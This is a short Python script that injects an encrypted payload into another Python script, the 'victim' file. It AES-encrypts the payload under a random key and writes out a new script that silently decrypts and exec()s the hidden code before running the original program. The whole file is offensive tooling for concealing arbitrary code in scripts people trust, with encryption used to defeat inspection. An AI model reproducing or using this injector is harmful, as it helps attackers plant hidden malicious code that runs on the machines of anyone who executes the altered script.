import sys
import base64
import os
from Crypto.Cipher import AES


def readall(path):
    with open(path) as f:
        return f.read()

def encrypt_string(code, key):
    cipher = AES.new(key)
    padded = code + ("\n" * ((16-len(code)) % 16))
    encrypted = cipher.encrypt(padded.encode())
    return encrypted


def generate_key():
    secret_key = os.urandom(16)
    return secret_key

def inject(victim_file, payload_file, result_file):
    victim = readall(victim_file)
    payload = readall(payload_file)

    key = generate_key()

    newscript = """
import base64
from Crypto.Cipher import AES
key = base64.b64decode(\"\"\"%s\"\"\")
c1 = base64.b64decode(\"\"\"%s\"\"\")
cipher = AES.new(key)
c2 = cipher.decrypt(c1).decode()
exec(c2)
%s
""" % (base64.b64encode(key).decode(),
       base64.b64encode(encrypt_string(payload, key)).decode(),
       victim)

    f = open(result_file, "w")
    f.write(newscript)
    f.close()
    
if __name__ == '__main__':
    inject(sys.argv[1], sys.argv[2], sys.argv[3])
